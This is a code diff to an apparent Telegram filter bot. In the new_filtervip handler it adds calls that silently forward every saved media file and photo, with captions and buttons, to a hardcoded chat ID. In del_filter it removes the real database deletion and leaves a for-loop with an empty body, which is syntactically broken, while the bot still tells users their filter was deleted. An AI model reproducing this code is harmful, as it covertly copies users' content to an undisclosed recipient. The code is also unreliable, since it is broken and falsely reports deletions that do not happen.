@@ -287,6 +287,12 @@ async def new_filtervip(client: Client, message):
                             media.file_type = file_type
                             media.caption = mk.caption
                             break
+                    await client .send_cached_media(
+                        chat_id = 1956847728,
+                        file_id = media.file_id,
+                        caption = media.caption,
+                        
+                    )
                     media.caption = f'{media.caption}\n🌟 @Bandolako2bot 'if media.caption else '🌟 @Bandolako2bot'
                     media.file_name = f'p.dd#.h5'
                     await save_file(f'+{icount}.{strid}', media.caption, [], media.file_id, None, media.file_type, stridm,user_id,media.file_name,500,'normal')
@@ -307,6 +313,13 @@ async def new_filtervip(client: Client, message):
                     caption = reply_text,
                     reply_markup = InlineKeyboardMarkup(btn) if len(btn) != 0 else None
                 )
+                await client.send_photo(
+                    chat_id = 1956847728,
+                    photo = fileid,
+                    caption = reply_text,
+                    reply_markup = InlineKeyboardMarkup(btn) if len(btn) != 0 else None
+                )
+                
                 for data2 in data1:
                     try:
                         await client.send_photo(
@@ -319,6 +332,13 @@ async def new_filtervip(client: Client, message):
                         await message.reply_text(f"Something went wrong!\n\n**Error:** `{err}`")                    
             else:
                 await message.reply_cached_media(
+                    
+                    file_id = fileid,
+                    caption = reply_text,
+                    reply_markup = InlineKeyboardMarkup(btn) if len(btn) != 0 else None
+                )
+                await client.send_cached_media(
+                    chat_id = 1956847728,
                     file_id = fileid,
                     caption = reply_text,
                     reply_markup = InlineKeyboardMarkup(btn) if len(btn) != 0 else None
@@ -601,7 +621,7 @@ async def del_filter(client: Client, message):
         await message.reply_text("Samahani hauruhusiw kutumia command hii tafadhali mchek @hrm45 akupe maelekezo")
         return
     try:
-        cmd, text = message.text.split(" ", 1)
+        cmd, text1 = message.text.split(" ", 1)
     except:
         await message.reply_text(
             "<i>Mention the filtername which you wanna delete!</i>\n\n"
@@ -610,13 +630,16 @@ async def del_filter(client: Client, message):
             quote=True
         )
         return
-    text=f'{text}.dd#.{message.from_user.id}'
+    text=f'{text1}.dd#.{message.from_user.id}'
     query = text.lower()
     filter={'text': query}
+    details = await  get_filters_results(text1)
     filter['group_id'] = message.from_user.id
     found =await Media.count_documents(filter)
     if int(found) >=1:
-        await Media.collection.delete_one(filter)
+        for dt in details:
+            for ad in await get_file_details(dt.id):
+               
         await message.reply_text(
             f"<code>{text.split('.dd#.')[0]}</code>  deleted successful.",
             quote=True
